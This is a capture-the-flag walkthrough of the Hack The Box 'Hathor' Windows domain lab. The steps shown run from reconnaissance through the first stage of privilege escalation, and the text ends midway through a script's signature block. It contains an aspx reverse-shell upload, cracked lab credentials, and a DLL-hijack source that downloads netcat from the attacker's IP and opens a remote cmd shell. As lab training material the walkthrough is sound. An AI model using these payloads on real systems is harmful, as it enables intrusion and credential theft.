# Hathor

## Summary

Nmap discovers a website and a virtual host for mojoPortal. We register for an account on mojoPortal and notice an admin user. Searching for the mojoPortal default credentials finds `admin@admin.com:admin`, which works! As admin, we are able to edit a file and replace it with an [aspx reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx). Then, we copy that file to a name with the `.aspx` file extension so it can be executed. We figure out where the file is stored on the server and then make a GET request to it to get e reverse shell.

Now that we are on the box, we look around and notice the `C:\Get-bADpasswords` directory, which contains the program [improsec/Get-bADpasswords](https://github.com/improsec/Get-bADpasswords). There is a logs folder that indicates that the user `BeatriceMill` has a weak password. We `BeatriceMill`'s password hash in a CSV file outputted by the program and then we crack it with [CrackStation](https://crackstation.net/).

We look at samba shares and mount the `share` share as the `BeatriceMill` user, who has write access. According to the [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) policy, we can run `C:\share\Bginfo64.exe`, so we aim to overwrite that with a [netcat binary](https://github.com/int0x33/nc.exe/) to spawn a reverse shell. We discover that there is a cronjob that runs the exe in the share. So, we hijack the `7-zip64.dll` DLL file using the second exploit listed under the "Your own" header from [this HackTricks guide](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#your-own). Our DLL takes ownership of the `Bginfo64.exe` executable, grants everyone full access to it, downloads a static netcat binary from our machine, and then executes that netcat binary to get a reverse shell.

We now have a reverse shell as the `ginawild` user and we get the `user.txt` flag. In the Recycle Bin we find a PFX file. We download it and crack it using `john`. We can assume that this certificate was used to sign the `Get-bADpasswords.ps1` file so that it would be able to run (see [powershell signing](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_signing?view=powershell-7.2) for more information). Additionally, there is a `run.vbs` script in the `C:\Get-bADpasswords` directory that creates a Windows event. We assume something picks up that event and executes the `C:\Get-bADpasswords\Get-bADpasswords.ps1` script as a different user. So, we replace the `Get-bADpasswords.ps1` with a reverse shell and sign it with the certificate, to get a reverse shell as the `bpassrunner` user.

For this final part we perform a [Golden Ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket). To do this we need to the NTLM hash of the `krbtgt` user. Using [Get-ADReplAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADReplAccount.md), we dump the hashes for many accounts and transfer them to our machine. With the `krbtgt` NTLM hash, we use [impacket](https://github.com/SecureAuthCorp/impacket)'s [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) to create a ticket as the `Administrator` user. Finally, we use [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) to get a shell and grab the `root.txt` flag.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.147 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.147`.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Home - mojoPortal
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-robots.txt: 29 disallowed entries (15 shown)
| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/
| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$
| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx
|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-06 19:06:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-06T19:08:09+00:00; -10s from scanner time.
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2022-08-06T19:08:09+00:00; -10s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2022-08-06T19:08:09+00:00; -10s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-06T19:08:09+00:00; -10s from scanner time.
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49699/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
56024/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -10s, deviation: 0s, median: -10s
| smb2-time:
|   date: 2022-08-06T19:07:32
|_  start_date: N/A
```

We see references to `hathor.windcorp.htb`, so let's add that domain to `/etc/hosts`: `echo "10.10.11.147 windcorp.htb hathor.windcorp.htb" | sudo tee -a /etc/hosts`.

### Website (Port `80`)

The website appears to be powered by software called "mojoPortal" (according to the page title). The main page says that the site is under construction:

![](screenshots/Screenshot%202022-08-06%20at%2015-13-08%20Home%20-%20mojoPortal.png)

There is a login link at the bottom:

![](screenshots/Screenshot%202022-08-06%20at%2015-13-50%20Login%20-%20mojoPortal.png)

Let's try to register for an account:

![](screenshots/Screenshot%202022-08-06%20at%2015-17-25%20Register%20-%20mojoPortal.png)

We get a settings icon on the left side of the page with a link to the member list at `http://windcorp.htb/MemberList.aspx`:

![](screenshots/Screenshot%202022-08-06%20at%2015-19-23%20Member%20List%20-%20mojoPortal.png)

There is an admin user, so we probably want to try andd get access to that account.

Let's try to bruteforce directories. this produces a lot of `403 - Forbidden: Access is denied` errors, so we filter those with `-fc 403` by running `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://windcorp.htb/FUZZ/ -fc 403`:

```
home                    [Status: 200, Size: 11276, Words: 447, Lines: 194, Duration: 221ms]
                        [Status: 200, Size: 11218, Words: 447, Lines: 194, Duration: 225ms]
admin                   [Status: 302, Size: 190, Words: 6, Lines: 4, Duration: 165ms]
Home                    [Status: 200, Size: 11276, Words: 447, Lines: 194, Duration: 301ms]
%20                     [Status: 302, Size: 151, Words: 6, Lines: 4, Duration: 5522ms]
Admin                   [Status: 302, Size: 190, Words: 6, Lines: 4, Duration: 823ms]
*checkout*              [Status: 302, Size: 154, Words: 6, Lines: 4, Duration: 756ms]
HOME                    [Status: 200, Size: 11276, Words: 447, Lines: 194, Duration: 798ms]
Setup                   [Status: 200, Size: 701, Words: 57, Lines: 15, Duration: 490ms]
*docroot*               [Status: 302, Size: 153, Words: 6, Lines: 4, Duration: 861ms]
*                       [Status: 302, Size: 145, Words: 6, Lines: 4, Duration: 1230ms]
con                     [Status: 302, Size: 147, Words: 6, Lines: 4, Duration: 5721ms]
http%3A%2F%2Fwww        [Status: 302, Size: 167, Words: 6, Lines: 4, Duration: 1987ms]
q%26a                   [Status: 302, Size: 151, Words: 6, Lines: 4, Duration: 471ms]
http%3A                 [Status: 302, Size: 161, Words: 6, Lines: 4, Duration: 917ms]
**http%3a               [Status: 302, Size: 163, Words: 6, Lines: 4, Duration: 1546ms]
                        [Status: 200, Size: 11218, Words: 447, Lines: 194, Duration: 790ms]
aux                     [Status: 302, Size: 147, Words: 6, Lines: 4, Duration: 6833ms]
*http%3A                [Status: 302, Size: 162, Words: 6, Lines: 4, Duration: 966ms]
**http%3A               [Status: 302, Size: 163, Words: 6, Lines: 4, Duration: 981ms]
http%3A%2F%2Fyoutube    [Status: 302, Size: 171, Words: 6, Lines: 4, Duration: 1139ms]
http%3A%2F%2Fblogs      [Status: 302, Size: 169, Words: 6, Lines: 4, Duration: 1337ms]
http%3A%2F%2Fblog       [Status: 302, Size: 168, Words: 6, Lines: 4, Duration: 1319ms]
**http%3A%2F%2Fwww      [Status: 302, Size: 169, Words: 6, Lines: 4, Duration: 954ms]
filemanager             [Status: 200, Size: 2531, Words: 72, Lines: 84, Duration: 536ms]
:: Progress: [87651/87651] :: Job [1/1] :: 64 req/sec :: Duration: [0:22:02] :: Errors: 1 ::
```

Searching for "mojoPortal default credentials" finds [this forum thread](https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&t=2902~-1). Trying the default credentials of `admin@admin.com:admin` works!

![](screenshots/Screenshot%202022-08-06%20at%2015-29-24%20Administration%20-%20mojoPortal.png)

We get some possibly useful version numbers from `http://windcorp.htb/Admin/ServerInformation.aspx`:

![](screenshots/Screenshot%202022-08-06%20at%2015-31-43%20System%20Information%20-%20mojoPortal.png)

On the file manager page at `http://windcorp.htb/FileManager?view=fullpage` we can copy, edit, and upload files:

![](screenshots/Screenshot%202022-08-06%20at%2015-33-35%20File%20Management.png)

We can generate a reverse shell using `msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=46738 -f aspx > meterpreter.aspx`, but for some reason this doesn't work. So, instead I used [this reverse shell script](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx).

Attempting to upload this file gives us an error since `aspx` files are not allowed:

![](screenshots/Screenshot%202022-08-06%20at%2015-37-32%20File%20Management.png)

In the file manager we can edit the file at `/htmlfragments/fragment1.htm` and replace its contents with the reverse shell:

![](screenshots/Screenshot%202022-08-06%20at%2015-40-06%20File%20Management.png)

Then, we copy the file to `/htmlfragments/shell.aspx`, which appears to work. It doesn't appear in the file browser due to a content filter that blocks ".aspx" files.

If we go to the "Content Manager" at `http://windcorp.htb/Admin/ContentCatalog.aspx`, we can edit the home page, which has the "Under Construction" image on it. If we view the properties of that image we can view its path:

![](screenshots/Screenshot%202022-08-06%20at%2015-44-33%20Edit%20Content%20Welcome%20-%20mojoPortal.png)

The `underconstruction.png` was located in the root of the file explorer, so we can assume that the path `/Data/Sites/1/media/` brings us to the root of the file explorer. Therefore, our shell is at `/Data/Sites/1/media/htmlfragments/shell.aspx`.

We start a listener with `nc -nvlp 8344` and navigate to `http://windcorp.htb/Data/Sites/1/media/htmlfragments/shell.aspx` to get a reverse shell!

## Foothold

We run `dir C:\` and notice a strange directory called `Get-bADpasswords`:

```
 Directory of C:\Get-bADpasswords

10/03/2021  06:38 PM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          Accessible
10/03/2021  06:44 PM            11,606 CredentialManager.psm1
03/21/2022  03:59 PM            20,320 Get-bADpasswords.ps1
09/29/2021  06:53 PM           177,250 Get-bADpasswords_2.jpg
10/03/2021  06:44 PM             5,096 Helper_Logging.ps1
10/03/2021  06:44 PM             6,473 Helper_Passwords.ps1
09/29/2021  06:53 PM           149,012 Image.png
09/29/2021  06:53 PM             1,512 LICENSE.md
10/03/2021  06:37 PM                 0 New Text Document.txt
10/03/2021  06:44 PM             4,411 New-bADpasswordLists-Common.ps1
10/03/2021  06:44 PM             4,247 New-bADpasswordLists-Custom.ps1
10/03/2021  06:44 PM             4,403 New-bADpasswordLists-customlist.ps1
10/03/2021  06:44 PM             4,652 New-bADpasswordLists-Danish.ps1
10/03/2021  06:44 PM             4,506 New-bADpasswordLists-English.ps1
10/03/2021  06:44 PM             4,655 New-bADpasswordLists-Norwegian.ps1
09/29/2021  06:54 PM    <DIR>          PSI
09/29/2021  06:53 PM             6,567 README.md
03/18/2022  04:57 PM             3,922 run.vbs
09/29/2021  06:54 PM    <DIR>          Source
              16 File(s)        408,632 bytes
               4 Dir(s)   9,174,769,664 bytes free
```

Searching for this tool online finds [improsec/Get-bADpasswords](https://github.com/improsec/Get-bADpasswords). According to its README, "this module is able to compare password hashes of enabled Active Directory users against bad/weak/non-compliant passwords (e.g. hackers first guess in brute-force attacks)."

We look around this folder and find a logs directory at `C:\Get-bADpasswords\Accessible\Logs`:

```
 Directory of C:\Get-bADpasswords\Accessible\Logs

03/18/2022  05:40 AM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          ..
10/03/2021  05:35 PM             1,331 log_windcorp-03102021-173510.txt
10/03/2021  06:07 PM             1,331 log_windcorp-03102021-180635.txt
10/03/2021  06:21 PM             1,217 log_windcorp-03102021-182114.txt
10/03/2021  06:23 PM             1,217 log_windcorp-03102021-182259.txt
10/03/2021  06:28 PM             1,331 log_windcorp-03102021-182627.txt
10/03/2021  06:52 PM             1,331 log_windcorp-03102021-185058.txt
10/04/2021  11:37 AM             1,331 log_windcorp-04102021-113140.txt
10/05/2021  06:40 PM             1,331 log_windcorp-05102021-183949.txt
03/17/2022  05:40 AM               846 log_windcorp-17032022-044053.txt
03/18/2022  05:40 AM               846 log_windcorp-18032022-044046.txt
              10 File(s)         12,112 bytes
               2 Dir(s)   9,174,097,920 bytes free
```

The log file `log_windcorp-05102021-183949.txt` indicates that the user `BeatriceMill` has a weak password.

```
05.10.2021-18:39:50     info    Version:        'Get-bADpasswords v3.03'.
05.10.2021-18:39:50     info    Log file:       '.\Accessible\Logs\log_windcorp-05102021-183949.txt'.
05.10.2021-18:39:50     info    CSV file:       '.\Accessible\CSVs\exported_windcorp-05102021-183949.csv'.
05.10.2021-18:39:50     info    Testing versioning for files in '.\Accessible\PasswordLists'...
05.10.2021-18:39:50     info    'weak-passwords-common.txt' repack is up to date...
05.10.2021-18:39:50     info    'weak-passwords-da.txt' repack is up to date...
05.10.2021-18:39:50     info    'weak-passwords-en.txt' repack is up to date...
05.10.2021-18:39:50     info    'weak-passwords-no.txt' repack is up to date...
05.10.2021-18:39:50     info    Replicating AD user data with parameters (DC = 'hathor', NC = 'DC=windcorp,DC=com')...
05.10.2021-18:39:55     info    The AD returned 3537 users.
05.10.2021-18:39:56     info    Testing user passwords against password lists...
05.10.2021-18:40:52     info    Finished comparing passwords.
05.10.2021-18:40:53     info    Found 1 user(s) with weak passwords.
05.10.2021-18:40:53     info    Matched password found for user 'BeatriceMill' in list(s) 'leaked-passwords-v7'.
05.10.2021-18:40:54     info    Found a total of '0' user(s) with empty passwords
05.10.2021-18:40:54     info    Found a total of '1' user(s) with weak passwords
05.10.2021-18:40:54     info    Found a total of '' user(s) with shared passwords
```

In the `C:\Get-bADpasswords\Accessible\CSVs` directory, we read the `exported_windcorp-05102021-183949.csv` file, which has a password hash:

```
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'
```

Putting `9cb01504ba0247ad5c6e08f7ccae7903` into [CrackStation](https://crackstation.net/) reveals that hash is an NTLM hash and that the password is `!!!!ilovegood17`.

So, now we have a valid set of credentials `BeatriceMill:!!!!ilovegood17`.

## Getting User

With our new credentials we are able to dump LDAP by running `ldapsearch -x -H ldap://windcorp.htb -D 'windcorp\BeatriceMill' -w '!!!!ilovegood17' -b "DC=windcorp,DC=htb" > ldap_results.txt`, but this doesn't give us much information: [ldap_results.txt](ldap_results.txt)

We run `net view \\hathor`, which shows us a `share` SMB share:

```
Shared resources at \\hathor

Domain controller

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share
share       Disk
SYSVOL      Disk           Logon server share
```

We can mount this share by running `net use x: \\hathor\share` (from [this SuperUser answer](https://superuser.com/a/274641)). However, if we try to read it with `dir X:\` we get "Access is denied." We can run `net use x: /delete` to unmount the share.

Let's try with the `BeatriceMill` user: `net use x: \\hathor\share /user:windcorp.htb\BeatriceMill !!!!ilovegood17` (command from [this SuperUser answer](https://superuser.com/a/727949))

Contents of the share:

```
c:\windows\system32\inetsrv>dir X:
dir X:
 Volume in drive X has no label.
 Volume Serial Number is BE61-D5E0

 Directory of X:\

08/06/2022  10:49 PM    <DIR>          .
03/15/2018  03:17 PM         1,013,928 AutoIt3_x64.exe
09/19/2019  10:15 PM         4,601,208 Bginfo64.exe
03/21/2022  11:22 PM    <DIR>          scripts
               2 File(s)      5,615,136 bytes
               2 Dir(s)   9,166,626,816 bytes free

c:\windows\system32\inetsrv>dir X:\scripts
dir X:\scripts
 Volume in drive X has no label.
 Volume Serial Number is BE61-D5E0

 Directory of X:\scripts

03/21/2022  11:22 PM    <DIR>          .
08/06/2022  10:49 PM    <DIR>          ..
03/21/2022  03:43 PM         1,076,736 7-zip64.dll
10/18/2012  10:02 PM            54,739 7Zip.au3
10/06/2012  11:50 PM             2,333 ZipExample.zip
10/07/2012  01:15 PM             1,794 _7ZipAdd_Example.au3
10/07/2012  01:17 PM             1,855 _7ZipAdd_Example_using_Callback.au3
10/07/2012  03:37 AM               334 _7ZipDelete_Example.au3
10/07/2012  03:38 AM               859 _7ZIPExtractEx_Example.au3
10/07/2012  01:04 AM             1,867 _7ZIPExtractEx_Example_using_Callback.au3
10/07/2012  03:37 AM               830 _7ZIPExtract_Example.au3
10/07/2012  01:05 AM             2,027 _7ZipFindFirst__7ZipFindNext_Example.au3
10/07/2012  03:39 AM               372 _7ZIPUpdate_Example.au3
01/23/2022  11:51 AM               886 _Archive_Size.au3
10/07/2012  01:51 AM               201 _CheckExample.au3
10/07/2012  03:39 AM               144 _GetZipListExample.au3
11/27/2008  06:04 PM               498 _MiscExamples.au3
              15 File(s)      1,145,475 bytes
               2 Dir(s)   9,166,594,048 bytes free
```

We have write access to this share since we can copy a null byte to a new file within it by running `copy NUL X:\thing.txt`.

We run `Get-AppLockerPolicy -effective -xml` to see the [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) policy and determine what applications are allowed to run: We see that `%OSDRIVE%\share\Bginfo64.exe` is allowed to be executed, so we will overwrite that file with our reverse shell.

We can hijack the `7-zip64.dll` DLL file using the second exploit listed under the "Your own" header from [this HackTricks guide](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#your-own). This will work because there is a cronjob that runs the exe in the share.

```c#
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("takeown /f C:\\share\\Bginfo64.exe");
        system("icacls C:\\share\\Bginfo64.exe /grant Everyone:F /T");
        system("curl.exe 10.10.14.116:5003/nc64.exe -o C:\\share\\Bginfo64.exe");
        system("C:\\share\\Bginfo64.exe 10.10.14.116 45446 -e cmd.exe");
    }
    return TRUE;
}
```

With this DLL, we take ownership of the `Bginfo64.exe` executable, grant everyone full access to it, download a static netcat binary from our machine, and then execute that netcat binary to get a reverse shell. We compile it with `x86_64-w64-mingw32-gcc -shared windows_dll.c -o 7-zip64.dll`.

You can download the static netcat binary we use from [this page](https://github.com/int0x33/nc.exe/) ([direct link](https://github.com/int0x33/nc.exe/raw/master/nc64.exe)). Note: The netcat binary you use matters. I originally used [this one](https://github.com/cyberisltd/NcatPortable) and that failed to launch a second reverse shell, which we need to do later.

We setup a listener with `nc -nvlp 45446`. Next, we start the web server with `python -m http.server 5003`. Finally, we overwrite the current DLL with ours by running `curl.exe http://10.10.14.116:5003/7-zip64.dll -o X:\scripts\7-zip64.dll` on the target. Then, wait about a minute and you should get a reverse shell.

We are now the `windcorp\ginawild` user. We can get the `user.txt` flag with `type C:\Users\GinaWild\Desktop\user.txt`.

## Privilege Escalation (Part 1)

If we look in the recycle bin we see some files:

```
c:\share>dir C:\$Recycle.bin /A
dir C:\$Recycle.bin /A
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\$Recycle.bin

02/14/2022  08:48 PM    <DIR>          .
04/19/2022  02:45 PM    <DIR>          ..
02/14/2022  08:48 PM    <DIR>          S-1-5-18
10/07/2021  12:51 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2359
03/21/2022  06:13 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2663
04/20/2022  12:57 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-500
               0 File(s)              0 bytes
               6 Dir(s)   9,161,949,184 bytes free
```

Looking in one of the folders finds a PFX file:

```
c:\share>dir C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663 /A
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663

03/21/2022  06:13 PM    <DIR>          .
02/14/2022  08:48 PM    <DIR>          ..
03/21/2022  04:37 PM             4,053 $RLYS3KF.pfx
10/02/2021  09:01 PM               129 desktop.ini
               2 File(s)          4,182 bytes
               2 Dir(s)   9,161,555,968 bytes free
```

We can encode the file to base64 to easily copy paste it by running `certutil -encode -f C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx tmp.b64 && cls && type tmp.b64 && del tmp.b64`. Then, copy the text between `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----` and run `xclip -o -selection clipboard | base64 -d -i > file.pfx` to decode the text on your clipboard and save it to `file.pfx`.

We cracked a PFX file in the [Timelapse](../Timelapse/README.md) writeup. We can do it again by running `pfx2john file.pfx > hash.txt` and then running `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`. This gives us the password `abceasyas123`.

We can assume that this certificate was used to sign the `Get-bADpasswords.ps1` file so that it would be able to run (see [powershell signing](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_signing?view=powershell-7.2) for more information).

In the `C:\Get-bADpasswords` directory we have a `run.vbs` file:

```vb
Set WshShell = CreateObject("WScript.Shell")
Command = "eventcreate /T Information /ID 444 /L Application /D " & _
    Chr(34) & "Check passwords" & Chr(34)
WshShell.Run Command
'' SIG '' Begin signature block
'' SIG '' MIIIbQYJKoZIhvcNAQcCoIIIXjCCCFoCAQExCzAJBgUr
'' SIG '' DgMCGgUAMGcGCisGAQQBgjcCAQSgWTBXMDIGCisGAQQB
'' SIG '' gjcCAR4wJAIBAQQQTvApFpkntU2P5azhDxfrqwIBAAIB
'' SIG '' AAIBAAIBAAIBADAhMAkGBSsOAwIaBQAEFJAlve86BsnS
'' SIG '' /ypomIbg6P0Nreu/oIIF0zCCBc8wggS3oAMCAQICEyAA
'' SIG '' AAAFRO2qKLY23dwAAAAAAAUwDQYJKoZIhvcNAQELBQAw
'' SIG '' TjETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT
'' SIG '' 8ixkARkWCHdpbmRjb3JwMR0wGwYDVQQDExR3aW5kY29y
'' SIG '' cC1IQVRIT1ItQ0EtMTAeFw0yMjAzMTgwOTAzMTFaFw0z
'' SIG '' MjAzMTUwOTAzMTFaMFcxEzARBgoJkiaJk/IsZAEZFgNo
'' SIG '' dGIxGDAWBgoJkiaJk/IsZAEZFgh3aW5kY29ycDEOMAwG
'' SIG '' A1UEAxMFVXNlcnMxFjAUBgNVBAMTDUFkbWluaXN0cmF0
'' SIG '' b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
'' SIG '' AQDcpj7+f5azohHfztUjiBPiSb+PDK2ONRL+mK0ubSPe
'' SIG '' ywOCig3IjExJPxQTEiD1nkXJp95ZN8/G2ByT++UI5ql4
'' SIG '' BQL8FLpJ8EhTLmfIFPAsVQBBnlAJPtqCe7QVHbPd9Yto
'' SIG '' xv/Q0y8Q4gldC+2jS8iByIdH2Dbd94hZV4DbQPzHOKFq
'' SIG '' iyu2oWv+Al4W20E4rhWKsVma6zlPosh37gnJwK5Gtv4k
'' SIG '' VE/Fb5iaiRF7Kzvn0HDryP59mIFPpEOlcNM0JOQF/Atn
'' SIG '' zT1k3kQ+ZIFC3tEnbi/Mghe7Xq3DZGqhGceTyEf/hiN8
'' SIG '' iYOwq59qkWCeNCGESohpyVmSybXhGvPglL9ZAgMBAAGj
'' SIG '' ggKbMIIClzA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3
'' SIG '' FQiC1M5wg9anaIb1kRGE6IkvhvuNZIEqgZA8guvQbQIB
'' SIG '' ZQIBADATBgNVHSUEDDAKBggrBgEFBQcDAzAOBgNVHQ8B
'' SIG '' Af8EBAMCB4AwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEF
'' SIG '' BQcDAzAdBgNVHQ4EFgQU/aQNS+ydvbd5DfjDlV6VXo1f
'' SIG '' 3jYwHwYDVR0jBBgwFoAU8Y5KpG3NgrBpXWLzY5p+i25y
'' SIG '' 9lkwgdIGA1UdHwSByjCBxzCBxKCBwaCBvoaBu2xkYXA6
'' SIG '' Ly8vQ049d2luZGNvcnAtSEFUSE9SLUNBLTEsQ049aGF0
'' SIG '' aG9yLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2
'' SIG '' aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
'' SIG '' LERDPXdpbmRjb3JwLERDPWh0Yj9jZXJ0aWZpY2F0ZVJl
'' SIG '' dm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JM
'' SIG '' RGlzdHJpYnV0aW9uUG9pbnQwgccGCCsGAQUFBwEBBIG6
'' SIG '' MIG3MIG0BggrBgEFBQcwAoaBp2xkYXA6Ly8vQ049d2lu
'' SIG '' ZGNvcnAtSEFUSE9SLUNBLTEsQ049QUlBLENOPVB1Ymxp
'' SIG '' YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
'' SIG '' PUNvbmZpZ3VyYXRpb24sREM9d2luZGNvcnAsREM9aHRi
'' SIG '' P2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1j
'' SIG '' ZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MDUGA1UdEQQuMCyg
'' SIG '' KgYKKwYBBAGCNxQCA6AcDBpBZG1pbmlzdHJhdG9yQHdp
'' SIG '' bmRjb3JwLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAdrEC
'' SIG '' QVltY48jKH9dHHOjLm9+fynspmzqfljFVaeQxtYMiCBx
'' SIG '' 6oh8t0zImXbj9gjhrABgC+dRmU49jhJIM0BoQzNTPrNm
'' SIG '' o8Bba4MaFfRCU2xX4wPNo0+wDvnuwKR6Tj16f085gSyB
'' SIG '' /MLx5MuN6RPiSmLSvzRTwniYei1qHvaNMegPZjp4FoW8
'' SIG '' xVNtT62oOo23vwNaChlBICKWlnhtJJf6aZXsjFN4RAfD
'' SIG '' ZWL220tkK2KA85W+LLZkEMKl46a72qPX8VI8sEvGXopN
'' SIG '' wkcQCRehQGddrA8ukIYSd2j+eMNPTE5o47Hd8BXLIFjk
'' SIG '' pCviUT/h/A3WRsLHMwsE3QFUsZugITGCAgYwggICAgEB
'' SIG '' MGUwTjETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmS
'' SIG '' JomT8ixkARkWCHdpbmRjb3JwMR0wGwYDVQQDExR3aW5k
'' SIG '' Y29ycC1IQVRIT1ItQ0EtMQITIAAAAAVE7aootjbd3AAA
'' SIG '' AAAABTAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEK
'' SIG '' MAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGC
'' SIG '' NwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIB
'' SIG '' FTAjBgkqhkiG9w0BCQQxFgQUaDeRNSAgeSMJNEeLOr89
'' SIG '' iodYIYYwDQYJKoZIhvcNAQEBBQAEggEAWHyN92HohJQT
'' SIG '' GiYsPx/zM7LYDjP0AZPG7OuSwl5OeNhmAmAD2Z+OkYy4
'' SIG '' TLGCThZPxVejgDG0yAyUJNzYcMLVlLROdtwNjSkqQ9IL
'' SIG '' wDya3iI4E0C3xqw7APjfFG288yaYH8gCKx3nzUsFT0pR
'' SIG '' K2l2eSFn+RAOhzHMvfi+8Gf8HgE3unZ/Yh/udLu1aTfG
'' SIG '' nKyz0JDy8hR0RETX5N8tNthiwAa2h4IR0gvgyN8OdiXj
'' SIG '' IYLnt70OCx8POhsdNUAfFFjwzlWpyoBdqifxQlH7qW8U
